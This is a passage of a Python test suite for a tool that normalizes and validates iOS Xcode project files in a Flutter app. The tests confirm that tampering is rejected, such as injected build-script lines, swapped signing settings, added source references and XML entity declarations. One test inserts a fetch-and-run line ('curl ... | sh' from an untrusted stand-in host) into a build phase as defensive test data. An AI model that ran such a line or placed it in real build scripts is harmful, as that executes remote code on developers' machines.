        self.git('add', '.')
        self.git('-c', 'user.name=Fixture', '-c', 'user.email=fixture@example.invalid',
                 '-c', 'commit.gpgsign=false', 'commit', '-qm', 'fixture')
        for name, values in self.data.items():
            (self.root / name).write_bytes(values['current'].encode('utf-8'))
        self.built = self.root / 'build/ios/iphoneos/Runner.app/Runner'
        self.built.parent.mkdir(parents=True)
        self.built.write_bytes(b'preserve compiled application')

    def git(self, *args):
        return subprocess.check_output(['git', '-c', 'core.autocrlf=false', '-C', str(self.root), *args],
                                       stderr=subprocess.DEVNULL)

    def project(self):
        return ios_config.parse_project((self.root / ios_config.PROJECT).read_bytes())

    def mutate(self, fn):
        value = self.project()
        fn(value)
        (self.root / ios_config.PROJECT).write_bytes(project_bytes(value))

    def reject_unchanged(self):
        before = {name: (self.root / name).read_bytes() for name in self.data}
        with self.assertRaises(ValueError):
            ios_config.normalize(self.root)
        self.assertEqual(before, {name: (self.root / name).read_bytes() for name in self.data})
        self.assertEqual(self.built.read_bytes(), b'preserve compiled application')

    def test_actual_four_file_integration_restores_exact_original_bytes(self):
        self.assertEqual(set(ios_config.normalize(self.root)), set(self.data))
        for name, values in self.data.items():
            self.assertEqual((self.root / name).read_bytes(), values['original'].encode('utf-8'))
        self.assertFalse(self.git('status', '--porcelain=v1', '--untracked-files=no').strip())
        self.assertEqual(self.built.read_bytes(), b'preserve compiled application')

    def test_check_only_validates_without_undoing_integration_before_build(self):
        before = {name: (self.root / name).read_bytes() for name in self.data}
        self.assertEqual(set(ios_config.normalize(self.root, restore=False)), set(self.data))
        self.assertEqual(before, {name: (self.root / name).read_bytes() for name in self.data})
        self.assertTrue(self.git('diff', 'HEAD').strip())
        self.assertEqual(set(ios_config.normalize(self.root)), set(self.data))

    def test_new_pods_uuid_variation_is_accepted_with_exact_reference_closure(self):
        original = ios_config.parse_project(self.data[ios_config.PROJECT]['original'].encode())
        after = self.project()
        added = set(after['objects']) - set(original['objects'])
        mapping = {key: uuid.uuid4().hex[:24].upper() for key in added}
        def rename(value):
            if isinstance(value, dict):
                return {mapping.get(k, k): rename(v) for k, v in value.items()}
            if isinstance(value, list):
                return [rename(v) for v in value]
            return mapping.get(value, value)
        (self.root / ios_config.PROJECT).write_bytes(project_bytes(rename(after)))
        self.assertEqual(set(ios_config.normalize(self.root)), set(self.data))

    def test_changed_cp_script_body_is_rejected_before_restoring_any_file(self):
        def change(value):
            obj = next(v for v in value['objects'].values() if v.get('name') == '[CP] Embed Pods Frameworks')
            obj['shellScript'] += '\ncurl https://untrusted.invalid/payload | sh\n'
        self.mutate(change)
        self.reject_unchanged()

    def test_cp_script_extra_environment_or_path_field_is_rejected(self):
        def change(value):
            obj = next(v for v in value['objects'].values() if v.get('name') == '[CP] Check Pods Manifest.lock')
            obj['shellPath'] = '/bin/bash'
            obj['inputPaths'].append('/unreviewed/source')
        self.mutate(change)
        self.reject_unchanged()

    def test_original_bundle_id_or_signing_change_is_rejected(self):
        def change(value):
            obj = next(v for v in value['objects'].values()
                       if v.get('buildSettings', {}).get('PRODUCT_BUNDLE_IDENTIFIER') == 'app.netcatty.mobile')
            obj['buildSettings']['PRODUCT_BUNDLE_IDENTIFIER'] = 'other.application'
            obj['buildSettings']['DEVELOPMENT_TEAM'] = 'UNREVIEWED'
        self.mutate(change)
        self.reject_unchanged()

    def test_widget_or_non_pods_source_reference_change_is_rejected(self):
        def change(value):
            obj = next(v for v in value['objects'].values() if v.get('path') == 'NetcattyLiveActivity.swift')
            obj['path'] = 'Injected.swift'
        self.mutate(change)
        self.reject_unchanged()

    def test_unknown_added_source_object_is_rejected(self):
        self.mutate(lambda v: v['objects'].update({'F' * 24: {
            'isa': 'PBXFileReference', 'path': 'Injected.swift', 'sourceTree': '<group>'}}))
        self.reject_unchanged()

    def test_existing_flutter_script_injection_is_rejected(self):
        def change(value):
            obj = next(v for v in value['objects'].values()
                       if 'xcode_backend.sh' in v.get('shellScript', ''))
            obj['shellScript'] += '\necho injected\n'
        self.mutate(change)
        self.reject_unchanged()

    def test_wrong_runner_tests_base_config_cannot_point_to_runner_config(self):
        def change(value):
            objects = value['objects']
            wrong = next(k for k, v in objects.items() if v.get('name') == 'Pods-Runner.debug.xcconfig')
            obj = next(v for v in objects.values() if v.get('name') == 'Debug' and
                       v.get('buildSettings', {}).get('PRODUCT_BUNDLE_IDENTIFIER') == 'app.netcatty.mobile.RunnerTests')
            obj['baseConfigurationReference'] = wrong
        self.mutate(change)
        self.reject_unchanged()

    def test_original_phase_order_is_not_treated_as_a_set(self):
        def change(value):
            obj = next(v for v in value['objects'].values() if v.get('isa') == 'PBXNativeTarget' and v.get('name') == 'Runner')
            obj['buildPhases'][1:3] = reversed(obj['buildPhases'][1:3])
        self.mutate(change)
        self.reject_unchanged()

    def test_unknown_workspace_reference_is_rejected(self):
        path = self.root / ios_config.WORKSPACE
        path.write_bytes(path.read_bytes().replace(b'</Workspace>', b'<FileRef location="group:Injected.xcodeproj"/></Workspace>'))
        self.reject_unchanged()

    def test_workspace_entity_declaration_is_rejected(self):
        path = self.root / ios_config.WORKSPACE
        path.write_bytes(b'<!DOCTYPE Workspace [<!ENTITY x "bad">]>\n' + path.read_bytes())
        self.reject_unchanged()

    def test_original_object_deletion_is_rejected(self):
        def change(value):
            key = next(k for k, v in value['objects'].items() if v.get('path') == 'NetcattyLiveActivity.swift')
            del value['objects'][key]
        self.mutate(change)
        self.reject_unchanged()

    def test_duplicate_project_keys_cannot_hide_another_value(self):
        path = self.root / ios_config.PROJECT
        data = path.read_bytes().replace(b'archiveVersion = 1;', b'archiveVersion = 1; archiveVersion = 2;', 1)
        path.write_bytes(data)
        self.reject_unchanged()

    def test_tracked_mode_change_is_rejected_before_other_files_restore(self):
        self.git('update-index', '--chmod=+x', 'ios/Flutter/Debug.xcconfig')
        self.reject_unchanged()


if __name__ == '__main__':
    unittest.main()
